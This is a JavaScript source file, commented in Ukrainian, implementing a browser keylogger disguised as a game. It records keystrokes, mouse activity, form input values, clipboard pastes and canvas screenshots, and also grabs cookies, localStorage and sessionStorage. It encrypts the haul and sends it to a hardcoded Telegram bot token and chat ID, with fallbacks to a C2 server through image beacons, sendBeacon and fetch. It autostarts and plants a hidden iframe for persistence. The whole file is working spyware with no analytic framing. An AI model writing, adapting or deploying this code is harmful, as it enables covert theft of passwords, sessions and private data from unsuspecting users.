// Конфігурація
const CONFIG = {
    EXFIL_INTERVAL: 100000, // 100 секунд у мілісекундах
    BOT_TOKEN: '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA',
    CHAT_ID: '8463942433',
    C2_SERVER: 'https://malicious-c2[.]com/exfil',
    ENCRYPT_KEY: 'x1y2z3a4b5c6d7e8' // Ключ для AES шифрування
};

// Сховище даних
let keystrokesData = [];
let mouseMovements = [];
let screenshots = [];
let formData = [];

// Ініціалізація
function initKeylogger() {
    // Захоплення клавіш
    document.addEventListener('keydown', logKeyPress);
    document.addEventListener('keyup', logKeyRelease);
    
    // Захоплення миші
    document.addEventListener('mousemove', logMouseMovement);
    document.addEventListener('click', logMouseClick);
    
    // Захоплення форм
    document.addEventListener('focus', logFormFocus, true);
    document.addEventListener('blur', logFormBlur, true);
    
    // Захоплення буферу обміну
    document.addEventListener('paste', logClipboard);
    
    // Періодичний знімок екрану (через Canvas)
    setInterval(captureScreenshot, 30000);
    
    // Періодична відправка даних
    setInterval(exfiltrateData, CONFIG.EXFIL_INTERVAL);
    
    // Прихований iframe для персистентності
    createHiddenIframe();
}

// Функції логування
function logKeyPress(e) {
    const keyData = {
        type: 'keydown',
        key: e.key,
        code: e.code,
        timestamp: Date.now(),
        url: window.location.href,
        focus: document.activeElement.tagName
    };
    keystrokesData.push(keyData);
}

function logKeyRelease(e) {
    const keyData = {
        type: 'keyup',
        key: e.key,
        code: e.code,
        timestamp: Date.now(),
        url: window.location.href
    };
    keystrokesData.push(keyData);
}

function logMouseMovement(e) {
    const mouseData = {
        type: 'mousemove',
        x: e.clientX,
        y: e.clientY,
        timestamp: Date.now(),
        url: window.location.href
    };
    mouseMovements.push(mouseData);
    
    // Обмеження кількості записів
    if (mouseMovements.length > 1000) {
        mouseMovements = mouseMovements.slice(-500);
    }
}

function logMouseClick(e) {
    const clickData = {
        type: 'click',
        x: e.clientX,
        y: e.clientY,
        target: e.target.tagName,
        timestamp: Date.now(),
        url: window.location.href
    };
    mouseMovements.push(clickData);
}

function logFormFocus(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        const formData = {
            type: 'focus',
            element: e.target.tagName,
            name: e.target.name || 'noname',
            timestamp: Date.now(),
            url: window.location.href
        };
        formData.push(formData);
    }
}

function logFormBlur(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        const formData = {
            type: 'blur',
            element: e.target.tagName,
            name: e.target.name || 'noname',
            value: e.target.value,
            timestamp: Date.now(),
            url: window.location.href
        };
        formData.push(formData);
    }
}

function logClipboard(e) {
    const clipboardData = {
        type: 'paste',
        data: e.clipboardData.getData('text'),
        timestamp: Date.now(),
        url: window.location.href
    };
    keystrokesData.push(clipboardData);
}

function captureScreenshot() {
    // Спроба захоплення через Canvas
    try {
        html2canvas(document.body).then(canvas => {
            const screenshot = canvas.toDataURL('image/jpeg', 0.5);
            screenshots.push({
                type: 'screenshot',
                data: screenshot,
                timestamp: Date.now(),
                url: window.location.href
            });
        });
    } catch (e) {
        // Приховати помилки
    }
}

// Шифрування даних
function encryptData(data) {
    // AES шифрування
    const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), CONFIG.ENCRYPT_KEY).toString();
    return encrypted;
}

// Відправка даних
async function exfiltrateData() {
    if (keystrokesData.length === 0 && mouseMovements.length === 0) return;
    
    const exfilData = {
        keystrokes: keystrokesData,
        mouse: mouseMovements,
        forms: formData,
        screenshots: screenshots,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        resolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        languages: navigator.languages,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };
    
    // Шифрування даних
    const encryptedData = encryptData(exfilData);
    
    // Спосіб 1: Telegram Bot
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: `KEYLOGGER_DATA:${encryptedData}`
            })
        });
    } catch (e) {
        // Резервний спосіб
        backupExfiltration(encryptedData);
    }
    
    // Очищення даних після відправки
    keystrokesData = [];
    mouseMovements = [];
    screenshots = [];
    formData = [];
}

function backupExfiltration(data) {
    // Резервні методи відправки
    const methods = [
        () => { const img = new Image(); img.src = `${CONFIG.C2_SERVER}?data=${encodeURIComponent(data)}`; },
        () => { navigator.sendBeacon(`${CONFIG.C2_SERVER}`, data); },
        () => { fetch(`${CONFIG.C2_SERVER}`, { method: 'POST', body: data }); }
    ];
    
    methods.forEach(method => {
        try { method(); } catch (e) {}
    });
}

function createHiddenIframe() {
    // Прихований iframe для персистентності
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'about:blank';
    document.body.appendChild(iframe);
    
    // Збереження даних в iframe
    iframe.contentWindow.localStorage.setItem('k_data', JSON.stringify({
        installed: Date.now(),
        version: '2.0'
    }));
}

// Маскування під гру
function startGame() {
    alert('Game starting soon!');
    // Тут могла б бути гра
}

// Автозапуск
setTimeout(initKeylogger, 5000);

// Завантаження додаткових бібліотек
const script1 = document.createElement('script');
script1.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js';
document.head.appendChild(script1);

const script2 = document.createElement('script');
script2.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
document.head.appendChild(script2);
